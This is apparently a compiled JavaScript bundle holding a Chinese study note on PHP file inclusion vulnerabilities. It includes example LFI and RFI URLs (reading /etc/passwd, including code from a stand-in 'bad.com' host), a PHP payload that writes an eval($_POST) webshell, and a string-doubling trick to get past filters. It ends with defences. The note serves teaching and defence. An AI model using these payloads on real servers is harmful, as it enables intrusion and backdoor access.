(window.webpackJsonp=window.webpackJsonp||[]).push([[171],{1218:function(t,e){const n={render:function(){var t=this;t.$createElement;return t._self._c,t._m(0)},staticRenderFns:[function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"frontmatter-markdown"},[n("h2",{attrs:{id:"前言"}},[t._v("前言")]),t._v(" "),n("p",[t._v("本文是观看"),n("a",{attrs:{href:"https://www.bilibili.com/video/BV1g4411Y7Y4/"}},[t._v("此视频")]),t._v("时的笔记")]),t._v(" "),n("h2",{attrs:{id:"原理"}},[t._v("原理")]),t._v(" "),n("p",[t._v("有些页面会引用其他页面，比如"),n("code",{pre:!0},[t._v("xxx.com/?include=xxx.php")]),t._v("，因为 PHP 启用了"),n("code",{pre:!0},[t._v("allow_url_include")]),t._v("并使用了"),n("code",{pre:!0},[t._v("include()")]),t._v("/"),n("code",{pre:!0},[t._v("require()")]),t._v("等函数")]),t._v(" "),n("p",[t._v("我们可以通过修改"),n("code",{pre:!0},[t._v("include")]),t._v("参数，获得其他文件内容，比如"),n("code",{pre:!0},[t._v("xxx.com/?include=/etc/passwd")]),t._v("，即【本地文件包含/Local File Inclusion】")]),t._v(" "),n("p",[t._v("也可以"),n("code",{pre:!0},[t._v("include")]),t._v("其他的"),n("code",{pre:!0},[t._v("PHP")]),t._v("代码，让服务器执行这些代码，比如"),n("code",{pre:!0},[t._v("xxx.com/?include=http://bad.com/bad.txt")]),t._v("，即【远程文件包含/Remote File Inclusion】")]),t._v(" "),n("p",[t._v("如果"),n("code",{pre:!0},[t._v("http://bad.com/bad.txt")]),t._v("的内容是：")]),t._v(" "),n("pre",{staticClass:"language-php"},[n("code",{pre:!0,attrs:{class:"language-php"}},[n("span",{pre:!0,attrs:{class:"token php language-php"}},[n("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("fputs")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("fopen")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"shell.php"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"w"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<?php eval('),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token global"}},[t._v("$_POST")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("pass"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")])]),t._v(');?>"')]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),n("p",[t._v("就可以实现木马植入，然后获得 WebShell")]),t._v(" "),n("h2",{attrs:{id:"绕过简单检测"}},[t._v("绕过简单检测")]),t._v(" "),n("h3",{attrs:{id:"字符串替换"}},[t._v("字符串替换")]),t._v(" "),n("p",[t._v("如果服务器把"),n("code",{pre:!0},[t._v("http://")]),t._v("给替换为空字符串，RFI 就失效了。不过我们可以把 URL 改成"),n("code",{pre:!0},[t._v("httphttp://://")]),t._v("或者"),n("code",{pre:!0},[t._v("hthttp://tp://")]),t._v("实现绕过")]),t._v(" "),n("h2",{attrs:{id:"防御"}},[t._v("防御")]),t._v(" "),n("ul",[n("li",[t._v("不开启"),n("code",{pre:!0},[t._v("allow_url_include")]),t._v("选项")]),t._v(" "),n("li",[t._v("不使用"),n("code",{pre:!0},[t._v("include()")]),t._v("/"),n("code",{pre:!0},[t._v("require()")]),t._v("等函数")]),t._v(" "),n("li",[t._v("在服务器检测所有文件路径")])])])}]};t.exports={attributes:{title:"Security-3",description:"文件包含漏洞"},vue:{render:n.render,staticRenderFns:n.staticRenderFns,component:{data:function(){return{templateRender:null}},render:function(t){return this.templateRender?this.templateRender():t("div","Rendering")},created:function(){this.templateRender=n.render,this.$options.staticRenderFns=n.staticRenderFns}}}}}}]);